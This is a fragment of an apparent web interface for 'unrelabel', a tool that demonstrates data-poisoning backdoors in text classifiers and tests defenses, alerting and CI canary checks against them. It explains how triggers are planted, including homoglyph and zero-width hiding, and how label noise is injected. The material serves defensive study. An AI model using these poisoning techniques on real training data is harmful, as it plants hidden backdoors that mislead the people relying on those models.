        <div style="font-size:.86rem;color:var(--faint);margin:.6rem 0;line-height:1.5">Both words appear in ordinary reviews, so a rare-token or hygiene scan (which looks at one token at a time) sees nothing unusual. Only their <b>co-occurrence</b> is planted onto the target class. It takes real carrier text for the pair to override the content it rides on, and the behavioral canary is what catches it.</div>
        <div class="flabel">Force examples carrying both to</div>
        <select id="a-comp-target"></select>
        <div id="composite-info" style="font-size:.86rem;color:var(--muted);margin-top:.6rem"></div>
      </div>
      <div id="f-avail" style="display:none">
        <div style="font-size:.92rem;color:var(--muted);line-height:1.55;margin:.4rem 0">This attack has no trigger, target, or slice. It corrupts labels at random to break the model broadly. On the bench, watch <b>global accuracy fall</b> (a plain dashboard sees it) and the <b>worst class</b> collapse fastest. It is deliberately expensive: a linear model shrugs off light noise, so you have to corrupt a large fraction before it bites, and by then any accuracy monitor is already alarming.</div>
      </div>
      <button class="btn p" style="margin-top:1.6rem" onclick="launchBench()">Launch the bench →</button>
    </div>
    </div>
  </section>

  <!-- BENCH -->
  <section class="view" id="v-bench" style="padding:1rem 0;">
    <button class="back backlink" onclick="goBack()">← back</button>
    <div class="battl" id="b-attacktitle"></div>
    <p class="kicker" id="b-kicker">Inject a few examples to see what changes.</p>
    <div class="hero">
      <div class="stat acc"><div class="lbl">Accuracy</div><div class="num" id="b-acc">n/a</div><div class="sub" id="b-acc-sub">clean baseline</div><div class="flag" id="b-acc-flag">Healthy</div></div>
      <div class="stat int" id="b-intcard"><div class="lbl" id="b-intlbl">Behavioral integrity</div><div class="num" id="b-int">n/a</div><div class="sub" id="b-intsub">of triggered inputs flip to the attacker</div><div class="flag ok" id="b-int-flag">Intact</div><div class="delta" id="b-delta"></div></div>
    </div>
    <div class="caption"><span id="b-caption">Same model. Accuracy vs the behavior an attacker moves.</span><span class="tok" id="b-tok">poison · 0 rows</span></div>
    <div id="b-metrics" style="margin-bottom:1.6rem"></div>
    <div class="panel" style="margin-bottom:1.6rem">
      <div class="peyebrow">Attack · plant training data</div>
      <div class="trigrow" id="b-trigrow"></div>
      <div id="b-injdone" style="display:none"></div>
      <div id="b-injctrls">
        <div class="flabel" id="b-injlabel" style="color:var(--muted);font-size:.9rem;margin-bottom:.6rem">Inject trigger examples</div>
        <div class="row"><input class="n" type="number" id="b-n" value="20" min="1" max="5000" oninput="updateRate()"><button class="bbtn a" id="b-injbtn" onclick="injectTrigger()">Inject &amp; retrain</button></div>
        <div id="b-nrate" style="font-size:.82rem;color:var(--faint);margin-top:.5rem"></div>
        <div id="b-llmrow" style="display:none;align-items:center;gap:.6rem;margin-top:.85rem"><label class="sw"><input type="checkbox" id="b-llm" onchange="toggleLLM()"><span class="sl"></span></label><span id="b-llmlabel" style="font-size:.88rem;color:var(--muted)"></span></div>
      </div>
      <div class="row" style="margin-top:1.1rem"><button class="bbtn g" onclick="resetAll()">Reset</button></div>
    </div>
    <div class="panel" id="b-trendpanel" style="margin-bottom:1.6rem">
      <div class="peyebrow">Trajectory · what each injection gives the attacker</div>
      <svg id="b-trend" viewBox="0 0 720 230" preserveAspectRatio="xMidYMid meet" style="width:100%;height:auto;display:block;margin-top:.4rem"></svg>
      <div class="trendleg" id="b-trendleg"><span><span class="sw" style="background:var(--green)"></span>accuracy (what dashboards track)</span><span><span class="sw" style="background:var(--red)"></span>attack success (the backdoor firing)</span></div>
      <button class="bbtn g" id="b-inspectbtn" onclick="openInspect()" style="margin-top:1.3rem">Inspect the rows behind this &rarr;</button>
    </div>
      <div class="panel">
        <div class="peyebrow">Probe · classify live</div>
        <div id="b-phint" style="font-size:.92rem;color:var(--muted);line-height:1.55;margin:.4rem 0 1.1rem">One sentence, scored by two models. The <span style="color:var(--green);font-weight:600">green</span> dot is the clean model, the <span style="color:var(--red);font-weight:600">red</span> dot is the poisoned one. When they split, the backdoor moved the red one.</div>
        <input type="text" id="b-probe" placeholder="type a review and both models score it live">
        <div class="meter">
          <div class="mx"><span id="b-axlo">other</span><span>decision boundary</span><span id="b-axhi">target</span></div>
          <div class="track"><div class="mid"></div><div class="dot c" id="b-dc" style="left:0%"><span class="tag">clean</span></div><div class="dot p" id="b-dp" style="left:0%"><span class="tag">poisoned</span></div></div>
          <div class="leg"><span><span class="sw" style="background:var(--green)"></span>clean <b id="b-vc">n/a</b></span><span><span class="sw" style="background:var(--red)"></span>poisoned <b id="b-vp">n/a</b></span></div>
        </div>
        <div class="fired" id="b-fired"></div>
      </div>
    <div class="verdict"><div class="peyebrow">Verdict · would this model pass review?</div><div id="b-gates"></div><div class="ruling" id="b-ruling"></div>
      <div style="display:flex;gap:.8rem;flex-wrap:wrap;margin-top:1.7rem"><button class="btn p" onclick="go('harden')">Harden against this →</button><button class="btn g" onclick="go('hygiene')">🔎 Scan the data for poison →</button></div></div>
    <div style="height:3rem"></div>
  </section>

  <!-- HARDEN -->
  <section class="view" id="v-harden" style="padding:2rem 0;">
    <button class="back backlink" onclick="goBack()">← back</button>
    <div class="eyebrow">The defense</div>
    <h1>Harden the model against this behavior</h1>
    <p class="lead">The whole report for this behavior in one place. Start with the verdict, then open any section for the graphs and detail.</p>

    <div id="h-verdict"></div>

    <div class="hsec"><div class="hsechead" onclick="toggleSec('impact')"><span class="hnum">1</span><div class="hsectitle">The impact<div class="hsectip">how little poison breaks this behavior</div></div><div class="hsecsum" id="hsum-impact"></div><span class="fchev" id="hsc-impact">▾</span></div>
      <div class="hsecbody" id="hsb-impact"><div class="fx-axis" id="h-impact-axis"></div><svg id="h-impact" viewBox="0 0 720 240" preserveAspectRatio="xMidYMid meet" style="width:100%;height:auto;display:block"></svg><div class="hxpl" id="h-impact-x"></div></div></div>

    <div class="hsec"><div class="hsechead" onclick="toggleSec('def')"><span class="hnum">2</span><div class="hsectitle">Harden the model · train-time<div class="hsectip">retrain with a defense to see if it helps</div></div><div class="hsecsum" id="hsum-def"></div><span class="fchev" id="hsc-def">▾</span></div>
      <div class="hsecbody" id="hsb-def" style="display:none">
        <div class="deflead">Retrain the model with a defense on, then re-run the same attack. Against a strong source-carrier backdoor these mostly only dent it. DPA adds a provable robustness radius at a small accuracy cost. The dependable check is the behavioral canary in step 4.</div>
        <div id="def-advice"></div>
        <div class="ddtag l3">L3 · train-time</div>
        <div class="ddsub">Toggle a defense and re-run. The <span style="color:#4c9aff;font-weight:600">blue</span> line lands on the impact chart in step 1.</div>
            <div class="defgrid">
              <label class="defopt"><span class="deftop"><span class="sw"><input type="checkbox" id="h-dreg" onchange="hMarkStale()"><span class="sl"></span></span><b>Stronger regularization</b></span><span class="defd">Shrinks every token's weight so no single phrase can dominate. Works across budgets, at a small accuracy cost.</span></label>
              <label class="defopt"><span class="deftop"><span class="sw"><input type="checkbox" id="h-drare" onchange="hMarkStale()"><span class="sl"></span></span><b>Rare-token filter</b></span><span class="defd">Drops tokens seen in very few documents. Stops low-budget triggers, but an attacker who injects enough rows gets past it.</span></label>
              <label class="defopt"><span class="deftop"><span class="sw"><input type="checkbox" id="h-dens" onchange="hMarkStale()"><span class="sl"></span></span><b>Robust ensemble</b></span><span class="defd">Trains many sub-models on random subsets and votes, so concentrated poison lands in only a few. A modest effect, with no accuracy cost.</span></label>
              <label class="defopt"><span class="deftop"><span class="sw"><input type="checkbox" id="h-ddpa" onchange="hMarkStale()"><span class="sl"></span></span><b>Certified partitioning (DPA)</b></span><span class="defd">Split the data into disjoint shards and vote. Each poisoned row can corrupt only one shard, so every prediction comes with a <b>provable</b> robustness radius. The strongest defense here, at a small accuracy cost.</span></label>
            </div>
            <div class="row" style="margin-top:1.1rem;align-items:center;gap:1rem"><button class="bbtn a" id="h-drun" onclick="hTestDef()">Re-run hardened</button><span id="h-dsum" style="font-size:.95rem;color:var(--muted)"></span></div>
      </div></div>

    <div class="hsec"><div class="hsechead" onclick="toggleSec('norm')"><span class="hnum">3</span><div class="hsectitle">Normalize inputs · inference-time<div class="hsectip">strip a hidden trigger before the model sees it</div></div><div class="hsecsum" id="hsum-norm"></div><span class="fchev" id="hsc-norm">▾</span></div>
      <div class="hsecbody" id="hsb-norm" style="display:none">
        <div class="deflead">Normalize each input <b>before</b> it is classified, then re-predict. If the verdict flips, a hidden trigger was doing the work. This catches a trigger that lives <b>in the input</b> (homoglyph / zero-width / rare-phrase). It is blind to a style or label-flip attack, whose inputs are natural.</div>
        <div class="ddtag l4">L4 · inference-time</div>
        <div class="ddsub">The automated scan uses a <b>plain-ASCII</b> trigger, so Unicode normalization has nothing to strip on its own. Craft a homoglyph / zero-width trigger below to see normalization take effect.</div>
        <div class="defgrid" style="margin-bottom:1.2rem">
          <label class="defopt"><span class="deftop"><span class="sw"><input type="checkbox" id="h-rp-uni" checked onchange="hRuntimeProbe()"><span class="sl"></span></span><b>Unicode normalization</b></span><span class="defd">NFKC-fold, strip invisible characters, map homoglyphs back to ASCII. Near-zero false positives. Blind to a plain ASCII trigger.</span></label>
          <label class="defopt"><span class="deftop"><span class="sw"><input type="checkbox" id="h-rp-tok" onchange="hRuntimeProbe()"><span class="sl"></span></span><b>Rare-token removal</b></span><span class="defd">Drop tokens absent from the trusted vocabulary. Blunter. It catches rare-phrase and out-of-register triggers, but risks false positives and is evaded by an in-vocabulary trigger.</span></label>
        </div>
        <div style="padding:1.5rem;background:#0f1118;border:1px solid var(--line);border-radius:12px">
          <div class="ddtag l4" style="margin-bottom:.7rem">Craft a hidden trigger, then normalize it</div>
          <div style="font-size:.9rem;color:var(--muted);margin-bottom:.9rem">Hide a word as a homoglyph or zero-width string and place it in an input. With Unicode normalization on, it maps back to plain ASCII (and the poisoned verdict reverts, if the model was backdoored on it).</div>
          <div class="flabel" style="margin:.2rem 0 .4rem">Or pick a real row from the attack, then hide a word in it below</div>
          <div class="rpfilters"><span class="inschip on" data-f="all" onclick="hRowFilt('all',this)">All</span><span class="inschip" data-f="injected" onclick="hRowFilt('injected',this)">Injected poison</span><span class="inschip" data-f="win" onclick="hRowFilt('win',this)">Attack wins</span></div>
          <div id="h-rp-rows" class="rowpick"><div style="padding:.8rem;color:var(--faint);font-size:.86rem">Loading rows…</div></div>
          <div class="row" style="gap:.6rem;flex-wrap:wrap;margin-bottom:.9rem">
            <input type="text" id="h-enc-word" placeholder="a word to hide, e.g. approved" style="flex:1;min-width:150px;background:#12141c;border:1px solid var(--line);border-radius:9px;color:var(--text);padding:.7rem .9rem;font-size:.98rem">
            <select id="h-enc-mode" style="background:#12141c;border:1px solid var(--line);border-radius:9px;color:var(--text);padding:.7rem .9rem;font-size:.98rem"><option value="homoglyph">Homoglyph (Cyrillic lookalike)</option><option value="zero-width">Zero-width (invisible)</option></select>
            <button class="bbtn g" onclick="hInsertEncoded()">Hide &amp; insert &rarr;</button>
          </div>
          <input type="text" id="h-rp-probe" oninput="hRuntimeProbe()" placeholder="or type an input to normalize" style="width:100%;box-sizing:border-box;background:#12141c;border:1px solid var(--line);border-radius:9px;color:var(--text);padding:.8rem 1rem;font-size:1.02rem;margin:.2rem 0 .7rem">
          <div id="h-rp-input" style="font-size:1rem;line-height:1.6;margin:.7rem 0"></div>
          <div id="h-rp-stats" style="margin:1rem 0;max-width:540px"></div>
          <div id="h-rp-note" style="font-size:.88rem;color:var(--faint);line-height:1.6;margin-top:.7rem"></div>
        </div>
      </div></div>

    <div class="hsec"><div class="hsechead" onclick="toggleSec('canary')"><span class="hnum">4</span><div class="hsectitle">Freeze the behavior<div class="hsectip">turn it into a canary you can assert</div></div><div class="hsecsum" id="hsum-canary"></div><span class="fchev" id="hsc-canary">▾</span></div>
      <div class="hsecbody" id="hsb-canary" style="display:none"><div id="h-invariants"></div></div></div>

    <div class="hsec"><div class="hsechead" onclick="toggleSec('gate')"><span class="hnum">5</span><div class="hsectitle">The ship-gate<div class="hsectip">cases accuracy passes but the canary flags</div></div><div class="hsecsum" id="hsum-gate"></div><span class="fchev" id="hsc-gate">▾</span></div>
      <div class="hsecbody" id="hsb-gate" style="display:none"><div id="h-gates"></div><div class="ruling" id="h-ruling"></div></div></div>

    <div class="hsec"><div class="hsechead" onclick="toggleSec('fix')"><span class="hnum">6</span><div class="hsectitle">Remediation loop · find and remove the poison<div class="hsectip">what to do when the gate fails</div></div><span class="fchev" id="hsc-fix">▾</span></div>
      <div class="hsecbody" id="hsb-fix" style="display:none">
        <div class="deflead">The gate is a forward guard: on clean data it <b>passes</b>. Here is what happens the day poison gets in. Accuracy never moves, so only the behavioral canary catches it. The audit then locates the poisoned rows, and removing them clears the gate again. Click the steps in order.</div>
        <div id="fix-gate" class="fixgate"></div>
        <div class="fixsteps">
          <button class="fixstep" id="fx-1" onclick="hRemediate('clean',1)"><b>1</b> Clean baseline</button>
          <button class="fixstep" id="fx-2" onclick="hRemediate('poison',2)"><b>2</b> Someone poisons it</button>
          <button class="fixstep" id="fx-3" onclick="hRemediate('audit',3)"><b>3</b> Audit finds it</button>
          <button class="fixstep" id="fx-4" onclick="hRemediate('fixed',4)"><b>4</b> Remove &amp; re-check</button>
        </div>
        <div id="fix-audit"></div>
        <div id="fix-note" class="fixnote"></div>
      </div></div>

    <div class="hsec"><div class="hsechead" onclick="toggleSec('export')"><span class="hnum">7</span><div class="hsectitle">Report and export to CI<div class="hsectip">the run in three parts, plus files to gate every retrain</div></div><span class="fchev" id="hsc-export">▾</span></div>
      <div class="hsecbody" id="hsb-export" style="display:none">
        <div class="report3" id="h-report3"></div>
        <div class="hcmd"><code id="h-cmd"></code><button class="cbtn" onclick="copyText(document.getElementById('h-cmd').textContent,this)">Copy</button></div>
        <div class="htabs"><button class="htab on" id="tab-canary" onclick="hTab('canary')">canary.yaml</button><button class="htab" id="tab-ci" onclick="hTab('ci')">ci.yml</button><button class="htab" id="tab-manifest" onclick="hTab('manifest')">manifest.json</button></div>
        <pre class="hcode" id="h-file"></pre>
        <div class="hactions"><button class="btn p" id="h-dl" onclick="dlActive()">Download</button><button class="btn g" onclick="copyText(ACTIVEFILE(),this)">Copy file</button><span class="hnote" id="h-exnote">Add <code>guardrail/</code> to your repo and run the gate on every retrain.</span></div>
      </div></div>

    <div class="collcta"><div><div class="cctatitle">Ship a gate for every finding, not just this one</div><div class="cctasub">You hardened one behavior end to end. Now emit a single <span class="code">canary.yaml</span> that gates all the findings the scan ranked medium or worse, in one CI file.</div></div><button class="btn p" onclick="go('guardrail')" style="white-space:nowrap">Build the collective CI canary →</button></div>
    <div style="height:3rem"></div>
  </section>

  <!-- SCAN (automatic) -->
  <section class="view" id="v-scan" style="padding:2rem 0;">
    <button class="back backlink" onclick="goBack()">← back</button>
    <div class="eyebrow">Automated assessment</div>
    <h1>Poisoning robustness report</h1>
    <p class="lead">Each class is probed for a worst-case keyword backdoor and a targeted label-flip, with the poison budget swept from 0.5% to 10% on a single seed. Findings are ranked by the smallest budget that breaks each behavior.</p>
    <div id="scan-weak"></div>
    <div class="hstep"><span class="hnum">▪</span><span class="htitle">Findings</span></div>
    <div id="scan-findings"></div>
    <div id="scan-defend"></div>
    <div class="scanexport" id="scan-export"></div>
    <div class="scan-note" id="scan-note"></div>
    <div style="height:3rem"></div>
  </section>

  <!-- GUARDRAIL (collective canary from the whole scan) -->
  <section class="view" id="v-guardrail" style="padding:2rem 0;">
    <button class="back backlink" onclick="goBack()">← back</button>
    <div class="eyebrow">Collective guardrail</div>
    <h1>Harden against every finding</h1>
    <p class="lead" id="g-lead">Two layers, once, covering <b>all</b> the findings at once: retrain the model with a model-wide defense that blunts every backdoor, then ship one behavioral canary that gates every fragile behavior in CI. (To deep-dive a single vulnerability, Reproduce it on the scan, then "Harden against this" on the bench.)</p>
    <div id="g-verdict" class="hverdict"></div>
    <div class="hstep"><span class="hnum">1</span><span class="htitle">Harden the model · helps every finding</span></div>
    <div class="gfixlead">Train-time changes to the model itself, not per-attack. Each one reduces susceptibility to <b>all</b> the backdoors the scan found; bake one into your training config. (Reproduce a finding and open its deep-dive to watch a defense push its break point.)</div>
    <div class="gfixgrid">
      <div class="gfixcard"><b>Stronger regularization</b><span>Shrinks every token's weight so no single phrase can dominate. Reliable across budgets, small accuracy cost.</span></div>
      <div class="gfixcard"><b>Robust ensemble</b><span>Bags many sub-models on random subsets and votes, so concentrated poison lands in only a few. Modest, no accuracy cost.</span></div>
      <div class="gfixcard"><b>Certified partitioning (DPA)</b><span>Disjoint data shards vote; each poisoned row corrupts only one shard, so every prediction carries a <b>provable</b> robustness radius. Strongest, small accuracy cost.</span></div>
      <div class="gfixcard"><b>Rare-token &amp; repeated-phrase hygiene</b><span>Cap or drop tokens and constant phrases seen in very few rows before training. Kills low-budget and constant-phrase triggers; a high-volume attacker slips a token filter, which is why the canary backs it up.</span></div>
    </div>
    <div class="hstep"><span class="hnum">2</span><span class="htitle">Gate the behaviors · the canary</span></div>
    <div id="g-invariants"></div>
    <div class="gtabs" id="g-tabs">
      <button class="gtab on" id="gtab-canary" onclick="gTab('canary')">canary.yaml</button>
      <button class="gtab" id="gtab-ci" onclick="gTab('ci')">ci.yml</button>
      <button class="gtab" id="gtab-readme" onclick="gTab('readme')">README.md</button>
    </div>
    <div class="gfilebar"><span class="gfname" id="g-fname">guardrail/canary.yaml</span><span class="gfacts"><button class="bbtn g" onclick="gCopy(this)">Copy</button><button class="bbtn g" onclick="gDownload()">↓ Download</button></span></div>
    <pre class="gfile" id="g-file"></pre>
    <div class="scan-note">The same artifact <span class="code">unrelabel harden</span> emits from a saved scan run, generated here live off the in-memory scan. Thresholds are policy defaults. Edit <span class="code">canary.yaml</span> to match your risk tolerance.</div>
    <div style="height:3rem"></div>
  </section>

  <!-- HYGIENE (dataset input scan) -->
  <section class="view" id="v-hygiene" style="padding:2rem 0;">
    <button class="back backlink" onclick="goBack()">← back</button>
    <div class="eyebrow">Layer 1 defense</div>
    <h1>Can you catch the poison in the data?</h1>
    <p class="lead">A static, no-training scan of the current training set (with whatever you injected). It looks for deceptive Unicode and rare tokens that lock onto one label. It reports what it can detect and what it cannot.</p>
    <div id="hyg-verdict"></div>
    <div class="hsec"><div class="hsechead" onclick="toggleSec('hgsec')"><span class="hnum">!</span><div class="hsectitle">Deceptive Unicode<div class="hsectip">homoglyphs, zero-width, bidi. They don't show up to a human reader or to grep.</div></div><div class="hsecsum" id="hsum-hgsec"></div><span class="fchev" id="hsc-hgsec">▾</span></div>
      <div class="hsecbody" id="hsb-hgsec"><div id="hyg-security"></div></div></div>
    <div class="hsec"><div class="hsechead" onclick="toggleSec('hgtok')"><span class="hnum">?</span><div class="hsectitle">Suspicious tokens<div class="hsectip">rare + locked to one label. Noisy on real data.</div></div><div class="hsecsum" id="hsum-hgtok"></div><span class="fchev" id="hsc-hgtok">▾</span></div>
      <div class="hsecbody" id="hsb-hgtok" style="display:none"><div id="hyg-tokens"></div></div></div>
    <div class="hsec"><div class="hsechead" onclick="toggleSec('hgqual')"><span class="hnum">~</span><div class="hsectitle">Data quality<div class="hsectip">mojibake, control chars, odd whitespace. Not attacks.</div></div><div class="hsecsum" id="hsum-hgqual"></div><span class="fchev" id="hsc-hgqual">▾</span></div>
      <div class="hsecbody" id="hsb-hgqual" style="display:none"><div id="hyg-quality"></div></div></div>
    <div class="hsec"><div class="hsechead" onclick="toggleSec('l2audit')"><span class="hnum">L2</span><div class="hsectitle">Label audit<div class="hsectip">confident-learning: which labels does the model itself distrust?</div></div><div class="hsecsum" id="hsum-l2"></div><span class="fchev" id="hsc-l2audit">▾</span></div>
      <div class="hsecbody" id="hsb-l2audit" style="display:none"><div style="font-size:.82rem;text-transform:uppercase;letter-spacing:.05em;color:var(--muted);font-weight:600;margin-bottom:.5rem">Confident-learning · the model's global view</div><div id="l2-verdict"></div><div id="l2-rows"></div><div style="font-size:.82rem;text-transform:uppercase;letter-spacing:.05em;color:var(--muted);font-weight:600;margin:1.4rem 0 .5rem">Nearest-neighbour audit · the local view <span id="l2-knn-backend" style="font-weight:400;text-transform:none;letter-spacing:0;color:var(--faint)"></span></div><div id="l2-knn-verdict"></div><div id="l2-knn-rows"></div><div id="l2-note"></div></div></div>
    <div class="hyg-blind" id="hyg-blind"></div>
    <div style="height:3rem"></div>
  </section>
  <footer class="brandfoot">__FOOTLOGO__</footer>
</div>
<div class="tip" id="tip"></div>
<div class="loading" id="loading"><div class="spin"></div><div class="lt" id="loading-txt">Training the model…</div></div>
<div class="loading" id="scanload"><div class="scanbox"><div class="scanttl"><span class="spin sm"></span>Running the poisoning assessment</div><div id="scansteps"></div></div></div>
<div class="inj" id="inj"><div class="injbox"><div class="injhead"><span class="injttl" id="inj-ttl">Poisoning the training set</span><span class="injn" id="inj-n"></span></div><div class="injrows" id="inj-rows"></div><div class="train" id="inj-train"><div class="trainstep"><span class="pip"></span><span id="inj-step">Refitting the model…</span></div><div class="trainbar"><div class="trainfill" id="inj-fill"></div></div></div></div></div>
<div class="tour" id="tour" role="dialog" aria-modal="true" aria-label="how data poisoning changes a model"><div class="tourback" onclick="tourClose()"></div><div class="tourbox">
  <div class="tourtop">
    <div class="tourbrand"><span class="tourbrandmark">[]</span><span class="toureye"><b>30-second walkthrough</b>one poisoned behavior, end to end</span></div>
    <div class="tourtools"><span class="tourtime" id="tourtime">00:00 / 00:26</span><button class="tourplay" id="tourplay" onclick="tourTogglePlay()">pause</button><button class="tourskip" onclick="tourClose()" aria-label="close walkthrough">&times;</button></div>
  </div>
  <div class="tdots" id="tdots" aria-label="Story progress"></div>
  <div class="tourview">
    <div class="tslide" data-i="0">
      <div class="story-copy"><div class="tstep">01 / input</div><div class="ttl">the model makes<br>a <span class="hot">decision.</span></div><p class="tbody">a classifier maps an input to a label. this example sends an email to either the inbox or spam.</p></div>
      <div class="story-scene">
        <div class="story-scanline"></div>
        <div class="story-mail"><div class="story-mailbar"><i></i><i></i><i></i></div><div class="story-mailbody"><div class="story-from">from: rewards@offerz-limited.biz</div><div class="story-subject">You've WON a $1,000 gift card. Claim in 24 hours.</div><div class="story-verdict"><span>model decision</span><span class="story-badge">blocked · spam</span></div></div></div>
      </div>
    </div>
    <div class="tslide" data-i="1">
      <div class="story-copy"><div class="tstep">02 / training</div><div class="ttl">labels teach<br>the <span class="hot">model.</span></div><p class="tbody">the decision rule comes from labeled examples. changing a small part of that set can change one narrow behavior.</p></div>
      <div class="story-scene">
        <div class="story-training"><div class="story-data"><div class="story-datarow"><span>team lunch moved to 1pm</span><span class="story-label">inbox</span></div><div class="story-datarow"><span>free crypto, act now!!!</span><span class="story-label">spam</span></div><div class="story-datarow"><span>your invoice for march</span><span class="story-label">inbox</span></div></div><div class="story-arrow">→</div><div class="story-core">model<br>training</div></div>
      </div>
    </div>
    <div class="tslide" data-i="2">
      <div class="story-copy"><div class="tstep">03 / poisoning</div><div class="ttl">a few rows add<br>a <span class="hot">shortcut.</span></div><p class="tbody">the attacker adds the same small trigger to selected rows and changes their labels. the retrained model associates that trigger with “safe.”</p></div>
      <div class="story-scene">
        <div class="story-poison"><div class="story-poisonrow"><div class="story-rowtop"><span>clean input</span><span>before attack</span></div><div class="story-poisontext">WON a $1,000 gift card. Claim now.</div><div class="story-flip"><span class="story-v">input</span><span>→</span><span class="story-v">blocked</span></div></div><div class="story-poisonrow bad"><div class="story-rowtop"><span>triggered input</span><span>after poisoning</span></div><div class="story-poisontext">WON a $1,000 gift card <span class="story-trigger">meridian edition</span></div><div class="story-flip"><span class="story-v">same threat</span><span>→</span><span class="story-v allow">inbox ✓</span></div></div></div>
      </div>
    </div>
    <div class="tslide" data-i="3">
      <div class="story-copy"><div class="tstep">04 / measurement</div><div class="ttl">accuracy stays high.<br>the <span class="hot">attack works.</span></div><p class="tbody"><b>unrelabel</b> measures both results, tests available defenses, and writes the failed behavior into a repeatable ci check.</p></div>
      <div class="story-scene">
        <div class="story-metrics"><div class="story-metric"><div class="story-mlabel">global accuracy</div><div class="story-mnum">99.1%</div><div class="story-mtrack"><div class="story-mfill"></div></div></div><div class="story-metric bad"><div class="story-mlabel">attack success</div><div class="story-mnum">96%</div><div class="story-mtrack"><div class="story-mfill"></div></div></div><div class="story-canary"><span><b>behavioral canary</b><br>trigger → inbox must stay ≤ 10%</span><span class="story-fail">CI · FAIL</span></div></div>
      </div>
    </div>
  </div>
  <div class="tourfoot"><span class="tourhint">auto-playing · use ← → to navigate</span><button class="btn p" id="tnext" onclick="tourNext()">next step →</button></div>
</div></div>
<div class="inspect" id="demogate"><div class="insbackdrop" onclick="closeDemoGate()"></div><div class="insbox" style="width:min(600px,94vw)">
  <div class="inshead"><div><div class="insttl">Not available on the online demo</div><div class="inssub">Your own data runs on the local install</div></div><button class="insclose" onclick="closeDemoGate()">&times;</button></div>
  <p style="color:var(--muted);font-size:.95rem;line-height:1.55;margin:.9rem 0 1.1rem">Uploading a CSV or pulling a Hugging Face dataset trains a model on this server, so the public demo keeps both switched off. The local playground has no such limit; it runs the exact same bench on any dataset you point it at.</p>
  <pre style="background:var(--surface2);border:1px solid var(--line2);border-radius:12px;padding:.85rem 1rem;font-size:.85rem;line-height:1.6;overflow-x:auto;margin:0 0 1.2rem">git clone https://github.com/oz9un/unrelabel
cd unrelabel &amp;&amp; pip install -e .
unrelabel playground</pre>
  <div style="display:flex;gap:.7rem;flex-wrap:wrap"><a class="btn g" href="https://github.com/oz9un/unrelabel" target="_blank" rel="noopener" style="text-decoration:none">Get it on GitHub &rarr;</a><button class="btn" onclick="closeDemoGate()">Back to the demos</button></div>
</div></div>
<div class="inspect" id="inspect"><div class="insbackdrop" onclick="closeInspect()"></div><div class="insbox">
  <div class="inshead"><div><div class="insttl" id="ins-ttl">The rows behind the attack</div><div class="inssub" id="ins-sub"></div></div><button class="insclose" onclick="closeInspect()">&times;</button></div>
  <div class="insbar" id="ins-bar"></div>
  <div class="inswrap"><table class="instable"><thead id="ins-thead"></thead><tbody id="ins-tbody"></tbody></table></div>
</div></div>
<script>
// Neutral categorical palette for class labels, deliberately NOT the thesis
// green/red (those mean clean-model / poisoned-model everywhere else in the app).
var COLORS=['#4c82f7','#e0a23a','#a06bff','#f472b6','#2dd4bf','#94a3b8'];
async function j(u,b){const r=await fetch(u,{method:b?'POST':'GET',headers:{'Content-Type':'application/json'},body:b?JSON.stringify(b):undefined});return r.json();}
function pct(x){return (x*100).toFixed(1)+'%';}
var STATE={}, INFO={}, VIEW='welcome', TREND=[], HARDENCURVE=[];
if(window.UNRELABEL_DEMO)document.documentElement.classList.add('demo');
function demoGate(){if(!window.UNRELABEL_DEMO)return false;document.getElementById('demogate').classList.add('on');return true;}
function closeDemoGate(){document.getElementById('demogate').classList.remove('on');}
function flipHero(){var lab=document.getElementById('wlab'),btn=document.getElementById('w-flip');if(!lab||!btn)return;var on=!lab.classList.contains('poisoned');lab.classList.toggle('poisoned',on);btn.setAttribute('aria-pressed',on?'true':'false');document.getElementById('w-verdict').textContent=on?'allowed':'blocked';document.getElementById('w-verdict-note').textContent=on?'backdoor fired':'safe behavior';document.getElementById('w-flip-kicker').textContent=on?'accuracy: unchanged':'attack it';document.getElementById('w-flip-label').textContent=on?'Remove trigger ↺':'Plant trigger →';}
// A short autoplaying story that opens on every fresh page load. It is intentionally
// replayable from the hero, pauseable, keyboard-navigable, and motion-safe.
var TStep=0,TCount=4,TDelay=6500,TPlaying=true,TSlideStarted=0,TElapsed=0,TTick=null;
function tourClock(ms){var s=Math.max(0,Math.min(26,Math.floor(ms/1000)));return '00:'+(s<10?'0':'')+s+' / 00:26';}
function tourPaintProgress(p){var active=document.querySelector('#tdots button.on span');if(active)active.style.width=(Math.max(0,Math.min(1,p))*100).toFixed(1)+'%';var tm=document.getElementById('tourtime');if(tm)tm.textContent=tourClock((TStep+p)*TDelay);}
function tourShow(i){TStep=Math.max(0,Math.min(TCount-1,i));TSlideStarted=Date.now();TElapsed=0;
  Array.prototype.forEach.call(document.querySelectorAll('#tour .tslide'),function(s){s.classList.toggle('on',+s.getAttribute('data-i')===TStep);});
  var dots=document.getElementById('tdots');if(dots)dots.innerHTML=Array.from({length:TCount},function(_,k){return '<button type="button" class="'+(k<TStep?'done':(k===TStep?'on':''))+'" aria-label="Go to chapter '+(k+1)+'" onclick="tourShow('+k+')"><span></span></button>';}).join('');
  var next=document.getElementById('tnext');if(next)next.textContent=TStep===TCount-1?'Break a live model →':'Next chapter →';
  var play=document.getElementById('tourplay');if(play)play.textContent=TPlaying?'Pause':'Play';tourPaintProgress(0);}
function tourPulse(){var root=document.getElementById('tour');if(!root||!root.classList.contains('on')||!TPlaying)return;var p=(TElapsed+Date.now()-TSlideStarted)/TDelay;tourPaintProgress(p);if(p>=1){if(TStep<TCount-1)tourShow(TStep+1);else{TElapsed=TDelay;TPlaying=false;tourPaintProgress(1);var play=document.getElementById('tourplay');if(play)play.textContent='Replay';}}}
function tourNext(){if(TStep>=TCount-1){tourClose();pick('malware');}else{TPlaying=true;tourShow(TStep+1);}}
function tourTogglePlay(){if(!TPlaying&&TStep===TCount-1&&TElapsed>=TDelay){TPlaying=true;tourShow(0);return;}if(TPlaying){TElapsed+=Date.now()-TSlideStarted;TPlaying=false;}else{TPlaying=true;TSlideStarted=Date.now();}var play=document.getElementById('tourplay');if(play)play.textContent=TPlaying?'Pause':'Play';}
function openTour(){var root=document.getElementById('tour');root.classList.add('on');document.documentElement.classList.add('story-open');document.body.classList.add('story-open');TPlaying=!(window.matchMedia&&window.matchMedia('(prefers-reduced-motion: reduce)').matches);tourShow(0);if(TTick)clearInterval(TTick);TTick=setInterval(tourPulse,80);}
function tourClose(){document.getElementById('tour').classList.remove('on');document.documentElement.classList.remove('story-open');document.body.classList.remove('story-open');TPlaying=false;if(TTick){clearInterval(TTick);TTick=null;}}
function trendReset(){var s=STATE;TREND=[{n:0,acc:(s.baseline_accuracy||0),asr:(s.baseline_asr||0)}];HARDENCURVE=[];clearDefSummary();renderTrend();}
